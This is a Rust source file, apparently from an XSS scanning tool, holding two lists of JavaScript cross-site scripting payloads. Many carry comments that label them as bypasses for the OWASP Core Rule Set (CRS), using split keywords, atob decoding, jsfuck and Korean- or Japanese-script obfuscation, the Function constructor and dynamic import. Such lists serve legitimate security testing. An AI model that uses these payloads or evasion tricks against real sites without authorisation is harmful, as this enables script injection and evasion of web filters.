// inHTML, inAttr, ETC
pub(crate) const XSS_JAVASCRIPT_PAYLOADS_SMALL: &[&str] = &[
    "alert(1)",                      // alert
    "prompt`1`",                     // prompt with backtick
    "confirm(1)",                    // confirm
    "(_=prompt,_(1))",               // prompt with bypass technique
    "(((confirm)))``",               // confirm with bypass technique
    "[2].find(alert)",               // alert with bypass technique
    "top[\"al\"+\"\\ert\"](1)",      // alert with bypass technique2
    "(()=>alert(1))()",              // arrow function IIFE
    "window?.alert?.(1)",            // optional chaining
    "globalThis.alert(1)",           // globalThis reference
    "self['ale'+'rt'](1)",           // self + string concat
    "Reflect.apply(alert,null,[1])", // Reflect API
    // CRS bypass: avoid common keywords alert/confirm/prompt
    "new Function('ale'+'rt(1)')()", // Function constructor with split keyword
    "setTimeout('ale'+'rt(1)')",     // setTimeout with string concat
    "window[atob('YWxlcnQ=')](1)",   // atob-based keyword reconstruction
    "location='javas'+'cript:ale'+'rt(1)'", // location assignment with split
    "Set.prototype.has.call(new Set([alert]),alert)&&alert(1)", // Set API misdirection
];

// for inJS
pub(crate) const XSS_JAVASCRIPT_PAYLOADS: &[&str] = &[
    "alert(1)",                                                         // alert
    "alert`1`",                                                         // alert with backtick
    "prompt(1)",                                                        // prompt
    "prompt`1`",                                                        // prompt with backtick
    "confirm`1`",                                                       // prompt with backtick
    "confirm(1)",                                                       // confirm
    "x=new DOMMatrix;matrix=confirm;x.a=1;location='javascript'+':'+x", // confirm with DOMMatrix
    "this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])", // jsfuck
    "([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'(45)')()", // jsfuck + hangul
    "([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ア+=ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ア](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()", // jsfuck + katakana
    "(x=>x(1))(alert)",                // arrow callback
    "alert?.(1)??confirm(1)",          // nullish coalescing
    "alert.constructor('alert(1)')()", // constructor chain
    "void(alert(1))",                  // void operator
    "(0,alert)(1)",                    // comma operator
    "Object.values({a:alert})[0](1)",  // Object.values bypass
    "window[atob('YWxlcnQ=')](1)",     // atob bypass
    "[alert][0].call(null,1)",         // array access + call
    // CRS bypass: string reconstruction and indirect execution
    "new Function('\\x61lert(1)')()", // hex escape in Function constructor
    "setTimeout`\\x61lert\\x281\\x29`", // setTimeout with hex escapes
    "setInterval(alert,0,1)",         // setInterval alternative
    "Reflect.construct(Function,['ale'+'rt(1)'])()", // Reflect.construct
    "location='javas'+'cript:%61lert(1)'", // location with hex char
    "eval?.('\\141lert(1)')",         // optional chaining eval + octal
    "import('data:text/javascript,alert(1)')", // dynamic import (ES module)
    "document.body.innerHTML='<img/src=x onerror=alert(1)>'", // innerHTML sink
];

#[cfg(test)]
mod tests;
